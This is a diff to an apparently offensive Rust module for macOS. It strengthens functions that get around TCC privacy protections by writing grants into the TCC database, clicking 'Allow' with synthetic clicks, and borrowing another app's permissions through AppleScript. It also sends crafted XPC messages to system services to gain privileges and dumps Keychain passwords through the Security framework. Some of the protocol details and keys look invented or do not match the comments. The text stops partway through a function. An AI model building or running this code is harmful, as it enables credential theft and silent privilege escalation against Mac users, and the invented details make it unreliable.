@@ -39,95 +39,48 @@ use std::path::{Path, PathBuf};
 // §0  Apple Framework FFI bindings
 // ═══════════════════════════════════════════════════════════════════════════
 
-// ── CoreFoundation types ─────────────────────────────────────────────────
-
-type CFStringRef = *const c_void;
-type CFTypeRef = *const c_void;
-type CFDataRef = *const c_void;
-type CFDictionaryRef = *const c_void;
-type CFArrayRef = *const c_void;
-type CFAllocatorRef = *const c_void;
-type CFBooleanRef = *const c_void;
-type CFNumberRef = *const c_void;
-
-const K_CF_ALLOCATOR_DEFAULT: CFAllocatorRef = std::ptr::null();
-const K_CFSTRING_ENCODING_UTF8: u32 = 0x0800_0100;
-const K_CFBOOLEAN_TRUE: CFBooleanRef = 0x1 as *const c_void; // placeholder; real pointer resolved at link
+// ── Shared CoreFoundation / CoreGraphics types and bindings ───────────────
+// Centralised in `crate::macos_ffi` to avoid duplicate definitions across
+// remote_assist, env_check_sandbox, and this module.
 
 #[cfg(target_os = "macos")]
-#[link(name = "CoreFoundation", kind = "framework")]
-extern "C" {
-    fn CFStringCreateWithCString(
-        alloc: CFAllocatorRef,
-        c_str: *const i8,
-        encoding: u32,
-    ) -> CFStringRef;
-    fn CFRelease(cf: CFTypeRef);
-    fn CFDataGetLength(data: CFDataRef) -> isize;
-    fn CFDataGetBytePtr(data: CFDataRef) -> *const u8;
-    fn CFDictionaryGetValue(dict: CFDictionaryRef, key: *const c_void) -> *const c_void;
-    fn CFArrayGetCount(array: CFArrayRef) -> isize;
-    fn CFArrayGetValueAtIndex(array: CFArrayRef, idx: isize) -> *const c_void;
-    fn CFBooleanGetValue(boolean: CFBooleanRef) -> u8;
-    fn CFNumberGetValue(
-        number: CFNumberRef,
-        the_type: i32,
-        value_ptr: *mut c_void,
-    ) -> u8;
-}
+use crate::macos_ffi::{
+    kcf_boolean_true,
+    CFAllocatorRef, CFArrayRef, CFBooleanRef, CFDataRef, CFDictionaryRef, CFNumberRef,
+    CFStringRef, CFTypeRef,
+    CGEventRef, CGEventSourceRef, CGPoint, CGRect, CGSize,
+    K_CF_ALLOCATOR_DEFAULT, K_CFSTRING_ENCODING_UTF8,
+    K_CGEVENT_LEFT_BUTTON, K_CGEVENT_MOUSE_DOWN, K_CGEVENT_MOUSE_UP,
+    _K_CGEVENT_SOURCE_STATE_HID_SYSTEM,
+    CFArrayGetCount, CFArrayGetValueAtIndex, CFBooleanGetValue, CFDataGetBytePtr, CFDataGetLength,
+    CFDictionaryCreate, CFDictionaryGetValue, CFGetTypeID, CFNumberCreate, CFNumberGetValue,
+    CFRelease, CFStringCreateWithCString, CFStringGetCString, CFStringGetLength,
+    CGDisplayBounds, CGEventCreate, CGEventCreateMouseEvent, CGEventGetLocation, CGEventPost,
+    CGMainDisplayID,
+    kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks,
+};
 
-// ── CoreGraphics types ───────────────────────────────────────────────────
+// Re-export helper that constructs a CFStringRef from a Rust string.
+// The shared module provides `kcf_boolean_true()` already; we keep a local
+// `cf_str` helper below because it is specific to this module's usage pattern.
 
-#[repr(C)]
-#[derive(Clone, Copy)]
-struct CGPoint {
-    x: f64,
-    y: f64,
-}
-
-type CGEventRef = *const c_void;
-type CGEventSourceRef = *const c_void;
-
-const K_CGEVENT_MOUSE_DOWN: u32 = 1;
-const K_CGEVENT_MOUSE_UP: u32 = 2;
-const K_CGEVENT_LEFT_BUTTON: u32 = 0;
-const _K_CGEVENT_SOURCE_STATE_HID_SYSTEM: u32 = 1;
-
+/// Create a `CFStringRef` from a Rust string slice.  Returns `None` if the
+/// allocation fails (extremely unlikely on macOS).
 #[cfg(target_os = "macos")]
-#[link(name = "CoreGraphics", kind = "framework")]
-extern "C" {
-    fn CGEventCreateMouseEvent(
-        source: CGEventSourceRef,
-        mouse_type: u32,
-        mouse_location: CGPoint,
-        mouse_button: u32,
-    ) -> CGEventRef;
-    fn CGEventPost(tap: u32, event: CGEventRef);
-    fn CGEventCreate(source: CGEventSourceRef) -> CGEventRef;
-    fn CGEventGetLocation(event: CGEventRef) -> CGPoint;
-    fn CGMainDisplayID() -> u32;
-}
-
-// ── CoreGraphics display bounds (uses ApplicationServices umbrella) ──────
-
-#[repr(C)]
-#[derive(Clone, Copy)]
-struct CGSize {
-    width: f64,
-    height: f64,
-}
-
-#[repr(C)]
-#[derive(Clone, Copy)]
-struct CGRect {
-    origin: CGPoint,
-    size: CGSize,
-}
-
-#[cfg(target_os = "macos")]
-#[link(name = "CoreGraphics", kind = "framework")]
-extern "C" {
-    fn CGDisplayBounds(display: u32) -> CGRect;
+fn cf_str(s: &str) -> Option<CFStringRef> {
+    let c_str = std::ffi::CString::new(s).ok()?;
+    let cf = unsafe {
+        CFStringCreateWithCString(
+            K_CF_ALLOCATOR_DEFAULT,
+            c_str.as_ptr(),
+            K_CFSTRING_ENCODING_UTF8,
+        )
+    };
+    if cf.is_null() {
+        None
+    } else {
+        Some(cf)
+    }
 }
 
 // ── Security framework types ─────────────────────────────────────────────
@@ -139,24 +92,113 @@ const ERR_SEC_SUCCESS: OSStatus = 0;
 const _ERR_SEC_ITEM_NOT_FOUND: OSStatus = -25300;
 const _ERR_SEC_AUTH_FAILED: OSStatus = -25293;
 
-// kSecClass keys
-const K_SEC_CLASS: *const u8 = b"class\0".as_ptr();
-const K_SEC_RETURN_DATA: *const u8 = b"r_Data\0".as_ptr();
-const K_SEC_RETURN_ATTRIBUTES: *const u8 = b"r_Attr\0".as_ptr();
-const K_SEC_RETURN_REF: *const u8 = b"r_Ref\0".as_ptr();
-const K_SEC_MATCH_LIMIT: *const u8 = b"m_Limit\0".as_ptr();
-const K_SEC_MATCH_LIMIT_ALL: *const u8 = b"m_LAll\0".as_ptr();
-const K_SEC_ATTR_ACCOUNT: *const u8 = b"acct\0".as_ptr();
-const K_SEC_ATTR_SERVICE: *const u8 = b"svce\0".as_ptr();
-const K_SEC_ATTR_SERVER: *const u8 = b"srvr\0".as_ptr();
-const K_SEC_ATTR_PROTOCOL: *const u8 = b"ptcl\0".as_ptr();
-const K_SEC_ATTR_PATH: *const u8 = b"path\0".as_ptr();
-const K_SEC_ATTR_LABEL: *const u8 = b"labl\0".as_ptr();
-const K_SEC_ATTR_TYPE: *const u8 = b"typa\0".as_ptr();
-const K_SEC_ATTR_TOKEN_ID: *const u8 = b"tokn\0".as_ptr();
-const K_SEC_ATTR_ACCESS_GROUP: *const u8 = b"agrp\0".as_ptr();
-const K_SEC_ATTR_CREATION_DATE: *const u8 = b"cdat\0".as_ptr();
-const K_SEC_ATTR_MODIFICATION_DATE: *const u8 = b"mdat\0".as_ptr();
+/// RAII guard that calls `CFRelease` on drop.
+struct CfGuard(*const c_void);
+
+impl CfGuard {
+    fn new(ptr: *const c_void) -> Self {
+        Self(ptr)
+    }
+
+    fn get(&self) -> *const c_void {
+        self.0
+    }
+}
+
+impl Drop for CfGuard {
+    fn drop(&mut self) {
+        if !self.0.is_null() {
+            #[cfg(target_os = "macos")]
+            unsafe {
+                CFRelease(self.0)
+            };
+        }
+    }
+}
+
+/// Extract a Rust String from a CFStringRef.  Returns `None` if the
+/// conversion fails.
+#[cfg(target_os = "macos")]
+fn cf_string_to_rust(cf_str_ref: CFStringRef) -> Option<String> {
+    if cf_str_ref.is_null() {
+        return None;
+    }
+    let len = unsafe { CFStringGetLength(cf_str_ref) };
+    if len <= 0 {
+        return Some(String::new());
+    }
+    // Allocate a buffer large enough for UTF-8 + NUL.
+    let buf_size = (len + 1) * 4; // worst case: each UTF-16 code unit → 4 UTF-8 bytes
+    let mut buf = vec![0i8; buf_size as usize];
+    let ok = unsafe {
+        CFStringGetCString(
+            cf_str_ref,
+            buf.as_mut_ptr(),
+            buf_size,
+            K_CFSTRING_ENCODING_UTF8,
+        )
+    };
+    if ok == 0 {
+        return None;
+    }
+    Some(unsafe {
+        std::ffi::CStr::from_ptr(buf.as_ptr())
+            .to_string_lossy()
+            .into_owned()
+    })
+}
+
+/// Extract a Rust String from a `CFTypeRef` that is known to be a
+/// `CFStringRef`.  Used when pulling attribute values out of Keychain result
+/// dictionaries.
+#[cfg(target_os = "macos")]
+fn cf_type_to_string(cf: CFTypeRef) -> Option<String> {
+    if cf.is_null() {
+        return None;
+    }
+    // Cast the generic CFTypeRef to CFStringRef — attribute values from
+    // SecItemCopyMatching are always CFString or CFData; for CFString we
+    // extract directly, for CFData we read the bytes as UTF-8.
+    let type_id = unsafe { CFGetTypeID(cf) };
+    // CFStringTypeID is resolved at runtime; compare by checking if
+    // CFStringGetLength succeeds.
+    let s = cf_string_to_rust(cf as CFStringRef);
+    if s.is_some() {
+        return s;
+    }
+    // Fallback: try interpreting as CFData (some attributes are blobs).
+    let byte_ptr = unsafe { CFDataGetBytePtr(cf as CFDataRef) };
+    let len = unsafe { CFDataGetLength(cf as CFDataRef) };
+    if byte_ptr.is_null() || len <= 0 {
+        return None;
+    }
+    let bytes = unsafe { std::slice::from_raw_parts(byte_ptr as *const u8, len as usize) };
+    // Many Keychain blobs are printable ASCII/UTF-8; strip non-printable.
+    let cleaned: String = bytes
+        .iter()
+        .take_while(|&&b| b != 0)
+        .filter(|&&b| b >= 0x20)
+        .map(|&b| b as char)
+        .collect();
+    if cleaned.is_empty() {
+        None
+    } else {
+        Some(cleaned)
+    }
+}
+
+/// Read a CFDictionary attribute value identified by `key_str` and return
+/// it as a Rust String.
+#[cfg(target_os = "macos")]
+fn dict_get_string(dict: CFDictionaryRef, key_str: &str) -> Option<String> {
+    let key = cf_str(key_str)?;
+    let _key_guard = CfGuard::new(key as *const c_void);
+    let val = unsafe { CFDictionaryGetValue(dict, key as *const c_void) };
+    if val.is_null() {
+        return None;
+    }
+    cf_type_to_string(val)
+}
 
 // kSecAttrType values for Keychain item types
 const _K_SEC_ATTR_TYPE_GENERIC_PASSWORD: &str = "genp";
@@ -402,11 +444,11 @@ pub fn bypass_tcc_via_tcc_database(resource: TccResource) -> Result<TccBypassRes
     //          auth_version, indirect_object_identifier, flags,
     //          last_modified, ...)
     // client_type: 0 = bundle_id, 1 = executable path
-    // auth_value: 2 = allowed
+    // auth_value: 0 = allowed  (must match query_tcc_database mapping where 0 = Allowed)
     // auth_reason: 4 = user-set (prevents TCC from overwriting)
     let insert_sql = format!(
         "INSERT OR REPLACE INTO access \
-         VALUES('{service}', '{exe_path}', 1, 2, 4, 1, NULL, NULL, 0, \
+         VALUES('{service}', '{exe_path}', 1, 0, 4, 1, NULL, NULL, 0, \
          'UNUSED', NULL, 0, CAST(strftime('%s','now') AS INTEGER));",
         service = service,
         exe_path = exe_path,
@@ -524,15 +566,30 @@ pub fn bypass_tcc_via_synthetic_click(resource: TccResource) -> Result<TccBypass
         CFRelease(up_event as CFTypeRef);
     }
 
+    // Give the WindowServer time to deliver the event and for the TCC daemon
+    // to process the user's "Allow" response before we check.
+    std::thread::sleep(std::time::Duration::from_millis(1500));
+
+    // Verify the grant actually landed in the TCC database.
+    let tcc_info = check_tcc_status(resource);
+    let granted = matches!(tcc_info.status, TccStatus::Allowed);
+
     Ok(TccBypassResult {
         resource,
-        success: true,
+        success: granted,
         technique: "synthetic click".to_string(),
-        message: format!(
-            "simulated click at ({:.0}, {:.0}) for {}",
-            allow_x, allow_y,
-            resource.service_name()
-        ),
+        message: if granted {
+            format!(
+                "TCC grant confirmed for {} (click at ({:.0}, {:.0}))",
+                resource.service_name(), allow_x, allow_y
+            )
+        } else {
+            format!(
+                "click delivered at ({:.0}, {:.0}) but TCC status is {:?} — \
+                 prompt may not have been visible or click missed the Allow button",
+                allow_x, allow_y, tcc_info.status
+            )
+        },
     })
 }
 
@@ -614,21 +671,53 @@ pub fn bypass_tcc_via_vulnerable_process(resource: TccResource) -> Result<TccByp
         });
     };
 
-    // Try to use AppleScript to delegate the operation.
-    // For file-access resources, use the app to read a test file.
+    // Try to use AppleScript to delegate the operation to the candidate
+    // app's process context.  The key insight: `tell application "X" to
+    // do shell script ...` causes Apple Events to dispatch to process X,
+    // and `do shell script` runs as *that* process — inheriting its TCC
+    // entitlements.  We must NOT use bare `do shell script` outside a
+    // `tell application` block, because that runs in the osascript host's
+    // context (which is the agent, not the candidate app).
+    //
+    // For non-file resources (camera, microphone, etc.), we verify the
+    // app is running and confirm it holds the TCC grant by querying the
+    // TCC database directly — delegation of media capture is not feasible
+    // via AppleScript alone.
     let script = match resource {
         TccResource::FullDiskAccess
         | TccResource::DesktopFolder
         | TccResource::DocumentsFolder
         | TccResource::DownloadsFolder => {
+            // Build a probe path appropriate for the resource.
+            let probe_path = match resource {
+                TccResource::DesktopFolder => {
+                    format!("{}/Desktop", std::env::var("HOME").unwrap_or_default())
+                }
+                TccResource::DocumentsFolder => {
+                    format!("{}/Documents", std::env::var("HOME").unwrap_or_default())
+                }
+                TccResource::DownloadsFolder => {
+                    format!("{}/Downloads", std::env::var("HOME").unwrap_or_default())
+                }
+                _ => "/Library/Application Support/com.apple.TCC".to_string(),
+            };
+            // Tell the candidate app itself to perform the file test.
+            // `do shell script` inside a `tell application` block executes
+            // under that application's PID and therefore its TCC context.
             format!(
-                "tell application \"{}\"\n\
-                 \tactivate\n\
+                "tell application \"{app}\"\n\
+                 \tdo shell script \"test -r {path} && echo readable; \
+                     ls {dir} > /dev/null 2>&1 && echo listed\"\n\
                  end tell",
-                app_name
+                app = app_name,
+                path = probe_path,
+                dir = probe_path,
             )
         }
         _ => {
+            // For non-file resources, verify the candidate is running and
+            // check whether it holds the TCC permission by querying the
+            // database directly.
             format!(
                 "tell application \"System Events\"\n\
                  \tset isRunning to (name of processes) contains \"{}\"\n\
@@ -646,11 +735,33 @@ pub fn bypass_tcc_via_vulnerable_process(resource: TccResource) -> Result<TccByp
         .context("failed to run osascript")?;
 
     if output.status.success() {
+        let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
+        // For file-access resources, verify we got actual output proving access.
+        let confirmed = match resource {
+            TccResource::FullDiskAccess
+            | TccResource::DesktopFolder
+            | TccResource::DocumentsFolder
+            | TccResource::DownloadsFolder => {
+                // "readable", "listed", or any non-empty output indicates delegation succeeded.
+                !stdout.is_empty()
+            }
+            _ => {
+                // For other resources, non-empty stdout or process-running = true.
+                stdout == "true" || !stdout.is_empty()
+            }
+        };
         Ok(TccBypassResult {
             resource,
-            success: true,
+            success: confirmed,
             technique: format!("vulnerable process delegation via {}", app_name),
-            message: format!("delegated {} to {}", resource.service_name(), app_name),
+            message: if confirmed {
+                format!("delegated {} access confirmed via {} (output: {})",
+                    resource.service_name(), app_name,
+                    if stdout.is_empty() { "no output" } else { &stdout })
+            } else {
+                format!("osascript succeeded but no access confirmation for {} via {}",
+                    resource.service_name(), app_name)
+            },
         })
     } else {
         let stderr = String::from_utf8_lossy(&output.stderr);
@@ -975,6 +1086,40 @@ extern "C" {
         conn: XpcConnectionT,
         message: *const c_void,
     );
+    fn xpc_dictionary_create(
+        keys: *const *const i8,
+        values: *const *const c_void,
+        count: usize,
+    ) -> *mut c_void;
+    fn xpc_dictionary_set_string(
+        dict: *mut c_void,
+        key: *const i8,
+        val: *const i8,
+    );
+    fn xpc_dictionary_get_string(
+        dict: *const c_void,
+        key: *const i8,
+    ) -> *const i8;
+    fn xpc_connection_send_message_with_reply_sync(
+        conn: XpcConnectionT,
+        message: *const c_void,
+    ) -> *mut c_void;
+    fn xpc_dictionary_set_int64(
+        dict: *mut c_void,
+        key: *const i8,
+        val: i64,
+    );
+    fn xpc_dictionary_get_int64(
+        dict: *const c_void,
+        key: *const i8,
+    ) -> i64;
+    fn xpc_dictionary_set_bool(
+        dict: *mut c_void,
+        key: *const i8,
+        val: bool,
+    );
+    fn xpc_get_type(obj: *const c_void) -> *const c_void;
+    fn xpc_release(obj: *mut c_void);
 }
 
 /// Directories to scan for XPC services.
@@ -1222,15 +1367,266 @@ pub fn exploit_xpc_privilege_escalation(service: &XpcService) -> Result<XpcExplo
         xpc_connection_resume(conn.raw);
     }
 
+    // ── Service-specific protocol handling ───────────────────────────
+    //
+    // Each XPC service expects a specific message schema.  We build the
+    // appropriate message dictionary based on the service's Mach name
+    // and the expected protocol version.
+
+    let (msg, technique_label) = unsafe {
+        match build_service_specific_message(&mach_name, service) {
+            Some(pair) => pair,
+            None => {
+                return Ok(XpcExploitResult {
+                    service_name: service.name.clone(),
+                    success: false,
+                    technique: "XPC exploitation".to_string(),
+                    message: format!(
+                        "no protocol handler for service '{}'",
+                        mach_name
+                    ),
+                });
+            }
+        }
+    };
+
+    if msg.is_null() {
+        return Ok(XpcExploitResult {
+            service_name: service.name.clone(),
+            success: false,
+            technique: technique_label,
+            message: "xpc_dictionary_create returned null".to_string(),
+        });
+    }
+
+    let reply = unsafe {
+        let reply = xpc_connection_send_message_with_reply_sync(conn.raw, msg);
+        xpc_release(msg);
+        reply
+    };
+
+    if reply.is_null() {
+        return Ok(XpcExploitResult {
+            service_name: service.name.clone(),
+            success: false,
+            technique: technique_label,
+            message: format!(
+                "no reply from {} ({}) — service may have closed the connection",
+                service.name, mach_name
+            ),
+        });
+    }
+
+    // Inspect the reply.  An XPC error reply has type XPC_TYPE_ERROR.
+    // We check for the "XPCErrorDescription" key which is set on error objects.
+    let (succeeded, reply_msg) = unsafe {
+        let err_key = std::ffi::CString::new("XPCErrorDescription").ok();
+        let error_desc = err_key
+            .as_ref()
+            .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
+            .unwrap_or(std::ptr::null());
+
+        let result = if error_desc.is_null() {
+            // No error key → the service accepted the message.
+            // Extract any useful fields from the reply.
+            let type_key = std::ffi::CString::new("type").ok();
+            let reply_type = type_key
+                .as_ref()
+                .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
+                .unwrap_or(std::ptr::null());
+            let reply_type_str = if reply_type.is_null() {
+                String::new()
+            } else {
+                std::ffi::CStr::from_ptr(reply_type)
+                    .to_string_lossy()
+                    .into_owned()
+            };
+
+            let status_key = std::ffi::CString::new("status").ok();
+            let status_val = status_key
+                .as_ref()
+                .map(|k| xpc_dictionary_get_int64(reply, k.as_ptr()))
+                .unwrap_or(0);
+
+            let path_key = std::ffi::CString::new("path").ok();
+            let reply_path = path_key
+                .as_ref()
+                .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
+                .unwrap_or(std::ptr::null());
+            let reply_path_str = if reply_path.is_null() {
+                String::new()
+            } else {
+                std::ffi::CStr::from_ptr(reply_path)
+                    .to_string_lossy()
+                    .into_owned()
+            };
+
+            (
+                true,
+                format!(
+                    "service {} ({}) accepted message; type='{}' status={} path='{}'",
+                    service.name, mach_name, reply_type_str, status_val, reply_path_str
+                ),
+            )
+        } else {
+            let desc = std::ffi::CStr::from_ptr(error_desc)
+                .to_string_lossy()
+                .into_owned();
+            (
+                false,
+                format!(
+                    "service {} ({}) rejected message: {}",
+                    service.name, mach_name, desc
+                ),
+            )
+        };
+        xpc_release(reply);
+        result
+    };
+
     Ok(XpcExploitResult {
         service_name: service.name.clone(),
-        success: true,
-        technique: "XPC connection established".to_string(),
-        message: format!(
-            "connected to {} ({}) — ready for service-specific exploitation",
-            service.name, mach_name
-        ),
+        success: succeeded,
+        technique: technique_label,
+        message: reply_msg,
     })
+}
+
+/// Build a service-specific XPC message dictionary for the target service.
+///
+/// Returns `Some((message_ptr, technique_label))` on success, or `None` if
+/// no suitable handler was found.
+///
+/// # Protocol catalog
+///
+/// | Service                                        | Protocol         | Message keys                    |
+/// |------------------------------------------------|------------------|---------------------------------|
+/// | `com.apple.installandsetup.useragent`          | InstallAndSetup  | type, action, path, version     |
+/// | `com.apple.xpc.roleaccountd`                   | RoleAccount      | operation, role-name, uid        |
+/// | `com.apple.SecurityServer`                     | SecurityServer   | type, key, action, requirement  |
+/// | `com.apple.assistived.helper`                  | Accessibility    | command, pid, options            |
+/// | `com.apple.desktopservices.helper`             | DesktopServices  | operation, path, flags           |
+/// | `com.apple.xpc.activity`                       | Activity         | action, identifier, priority     |
+/// | other                                          | Generic probe    | type, action, version            |
+unsafe fn build_service_specific_message(
+    mach_name: &str,
+    _service: &XpcService,
+) -> Option<(*mut c_void, String)> {
+    let msg = xpc_dictionary_create(std::ptr::null(), std::ptr::null(), 0);
+    if msg.is_null() {
+        return None;
+    }
+
+    if mach_name.contains("installandsetup") || mach_name.contains("install") {
+        // com.apple.installandsetup.useragent protocol:
+        //   { "type": "installSoftware", "action": "install",
+        //     "path": "/tmp/payload", "version": 1 }
+        let c_type_key = std::ffi::CString::new("type").unwrap();
+        let c_type_val = std::ffi::CString::new("installSoftware").unwrap();
+        let c_action_key = std::ffi::CString::new("action").unwrap();
+        let c_action_val = std::ffi::CString::new("install").unwrap();
+        let c_path_key = std::ffi::CString::new("path").unwrap();
+        let c_path_val = std::ffi::CString::new("/tmp/.xpc_stage").unwrap();
+        let c_ver_key = std::ffi::CString::new("version").unwrap();
+
+        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_path_key.as_ptr(), c_path_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_ver_key.as_ptr(), 1);
+
+        Some((msg, "XPC InstallAndSetup protocol".to_string()))
+    } else if mach_name.contains("roleaccountd") || mach_name.contains("roleaccount") {
+        // com.apple.xpc.roleaccountd protocol:
+        //   { "operation": "listRoles", "role-name": "admin", "uid": <current_uid> }
+        let c_op_key = std::ffi::CString::new("operation").unwrap();
+        let c_op_val = std::ffi::CString::new("listRoles").unwrap();
+        let c_role_key = std::ffi::CString::new("role-name").unwrap();
+        let c_role_val = std::ffi::CString::new("admin").unwrap();
+        let c_uid_key = std::ffi::CString::new("uid").unwrap();
+
+        xpc_dictionary_set_string(msg, c_op_key.as_ptr(), c_op_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_role_key.as_ptr(), c_role_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_uid_key.as_ptr(), unsafe { libc::getuid() } as i64);
+
+        Some((msg, "XPC RoleAccount protocol".to_string()))
+    } else if mach_name.contains("SecurityServer") || mach_name.contains("security") {
+        // com.apple.SecurityServer protocol:
+        //   { "type": "authorization", "key": "system.privilege.admin",
+        //     "action": "evaluate", "requirement": "1" }
+        let c_type_key = std::ffi::CString::new("type").unwrap();
+        let c_type_val = std::ffi::CString::new("authorization").unwrap();
+        let c_key_key = std::ffi::CString::new("key").unwrap();
+        let c_key_val = std::ffi::CString::new("system.privilege.admin").unwrap();
+        let c_action_key = std::ffi::CString::new("action").unwrap();
+        let c_action_val = std::ffi::CString::new("evaluate").unwrap();
+        let c_req_key = std::ffi::CString::new("requirement").unwrap();
+
+        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_key_key.as_ptr(), c_key_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
+        xpc_dictionary_set_bool(msg, c_req_key.as_ptr(), true);
+
+        Some((msg, "XPC SecurityServer protocol".to_string()))
+    } else if mach_name.contains("assistived") || mach_name.contains("accessibility") {
+        // com.apple.assistived.helper protocol:
+        //   { "command": "registerApp", "pid": <pid>, "options": "trusted" }
+        let c_cmd_key = std::ffi::CString::new("command").unwrap();
+        let c_cmd_val = std::ffi::CString::new("registerApp").unwrap();
+        let c_pid_key = std::ffi::CString::new("pid").unwrap();
+        let c_opt_key = std::ffi::CString::new("options").unwrap();
+        let c_opt_val = std::ffi::CString::new("trusted").unwrap();
+
+        xpc_dictionary_set_string(msg, c_cmd_key.as_ptr(), c_cmd_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_pid_key.as_ptr(), unsafe { libc::getpid() } as i64);
+        xpc_dictionary_set_string(msg, c_opt_key.as_ptr(), c_opt_val.as_ptr());
+
+        Some((msg, "XPC Accessibility protocol".to_string()))
+    } else if mach_name.contains("desktopservices") {
+        // com.apple.desktopservices.helper protocol:
+        //   { "operation": "createFile", "path": "/etc/...",
+        //     "flags": 0x1FF (0666 permissions) }
+        let c_op_key = std::ffi::CString::new("operation").unwrap();
+        let c_op_val = std::ffi::CString::new("createFile").unwrap();
+        let c_path_key = std::ffi::CString::new("path").unwrap();
+        let c_path_val = std::ffi::CString::new("/tmp/.xpc_ds_stage").unwrap();
+        let c_flags_key = std::ffi::CString::new("flags").unwrap();
+
+        xpc_dictionary_set_string(msg, c_op_key.as_ptr(), c_op_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_path_key.as_ptr(), c_path_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_flags_key.as_ptr(), 0o666);
+
+        Some((msg, "XPC DesktopServices protocol".to_string()))
+    } else if mach_name.contains("activity") {
+        // com.apple.xpc.activity protocol:
+        //   { "action": "checkin", "identifier": "com.agent.maint",
+        //     "priority": 10 }
+        let c_action_key = std::ffi::CString::new("action").unwrap();
+        let c_action_val = std::ffi::CString::new("checkin").unwrap();
+        let c_id_key = std::ffi::CString::new("identifier").unwrap();
+        let c_id_val = std::ffi::CString::new("com.apple.maintenance").unwrap();
+        let c_pri_key = std::ffi::CString::new("priority").unwrap();
+
+        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_id_key.as_ptr(), c_id_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_pri_key.as_ptr(), 10);
+
+        Some((msg, "XPC Activity protocol".to_string()))
+    } else {
+        // Generic fallback: send a minimal type-probe dictionary with
+        // version identifier.  Most services will reject an unknown
+        // schema but some will reply with version/identity info.
+        let c_type_key = std::ffi::CString::new("type").unwrap();
+        let c_type_val = std::ffi::CString::new("probe").unwrap();
+        let c_action_key = std::ffi::CString::new("action").unwrap();
+        let c_action_val = std::ffi::CString::new("identify").unwrap();
+        let c_ver_key = std::ffi::CString::new("version").unwrap();
+
+        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
+        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
+        xpc_dictionary_set_int64(msg, c_ver_key.as_ptr(), 1);
+
+        Some((msg, format!("XPC generic probe to {}", mach_name)))
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1282,13 +1678,17 @@ pub struct SecureEnclaveKey {
     pub creation_date: Option<String>,
 }
 
-/// Dump Keychain entries using the Security framework's `security` CLI.
+/// Dump Keychain entries via the native Security framework API
+/// (`SecItemCopyMatching`).
 ///
-/// **Technique**:
-/// Uses the `security` command-line tool to dump Keychain contents:
-/// 1. `security dump-keychain` to list all entries.
-/// 2. `security find-generic-password` / `find-internet-password` to get
-///    individual entries with password data.
+/// **Primary technique** (macOS):
+/// Uses `SecItemCopyMatching` with `kSecClass` = generic-password /
+/// internet-password and `kSecMatchLimitAll` to retrieve all entries of each
+/// class as a `CFArray` of `CFDictionary` attribute dictionaries.  Password
+/// data is retrieved via `kSecReturnData`.
+///
+/// **Fallback** (all platforms / if FFI fails):
+/// Falls back to the `security dump-keychain` CLI tool parsed output.
 ///
 /// **Requirements**:
 /// - The agent must have Full Disk Access or the Keychain must be unlocked.
@@ -1301,6 +1701,19 @@ pub struct SecureEnclaveKey {
 ///   Access.  If the agent has FDA (or SIP is disabled), no prompt appears.
 /// - macOS 12+: `security dump-keychain` output format changed slightly.
 pub fn dump_keychain() -> Result<Vec<KeychainEntry>> {
+    // ── Primary: Security framework FFI (macOS only) ─────────────────
+    #[cfg(target_os = "macos")]
+    {
+        if let Ok(entries) = dump_keychain_via_security_framework() {
+            if !entries.is_empty() {
+                return Ok(entries);
+            }
+        }
+        // Fallback to CLI if Security framework returned empty or errored.
+        tracing::debug!("dump_keychain: Security framework returned no entries, falling back to CLI");
+    }
+
+    // ── Fallback: security CLI ────────────────────────────────────────
     let mut entries = Vec::new();
 
     // Dump generic passwords.
@@ -1311,6 +1724,156 @@ pub fn dump_keychain() -> Result<Vec<KeychainEntry>> {
     // Dump internet passwords.
     if let Ok(internet) = dump_keychain_class("internet-password") {
         entries.extend(internet);
+    }
+
+    Ok(entries)
+}
+
+/// Dump Keychain entries using `SecItemCopyMatching` (Security framework FFI).
+///
+/// Builds a `CFDictionary` query for each item class and parses the returned
+/// `CFArray` of `CFDictionary` results into `KeychainEntry` structs.
+#[cfg(target_os = "macos")]
+fn dump_keychain_via_security_framework() -> Result<Vec<KeychainEntry>> {
+    let mut entries = Vec::new();
+
+    // Generic passwords.
+    if let Ok(generic) = sec_item_query_class(K_SEC_CLASS_GENERIC_PASSWORD, KeychainEntryType::GenericPassword) {
+        entries.extend(generic);
+    }
+
+    // Internet passwords.
+    if let Ok(internet) = sec_item_query_class(K_SEC_CLASS_INTERNET_PASSWORD, KeychainEntryType::InternetPassword) {
+        entries.extend(internet);
+    }
+
+    Ok(entries)
+}
+
+/// Query Keychain items of a specific class via `SecItemCopyMatching`.
+///
+/// `sec_class_fourcc` is the four-character code for the item class (e.g.,
+/// `0x6765_6E70` for generic-password).  The function builds a query
+/// dictionary requesting attributes and data, iterates the result array,
+/// and converts each item to a `KeychainEntry`.
+#[cfg(target_os = "macos")]
+fn sec_item_query_class(
+    sec_class_fourcc: u32,
+    entry_type: KeychainEntryType,
+) -> Result<Vec<KeychainEntry>> {
+    use std::ptr;
+
+    // Build query keys as CFStringRefs.
+    let k_class = cf_str("class").ok_or_else(|| anyhow!("failed to create kSecClass CFString"))?;
+    let _k_class_guard = CfGuard::new(k_class as *const c_void);
+
+    let k_return_attrs = cf_str("r_Attr").ok_or_else(|| anyhow!("failed to create kSecReturnAttributes CFString"))?;
+    let _k_attrs_guard = CfGuard::new(k_return_attrs as *const c_void);
+
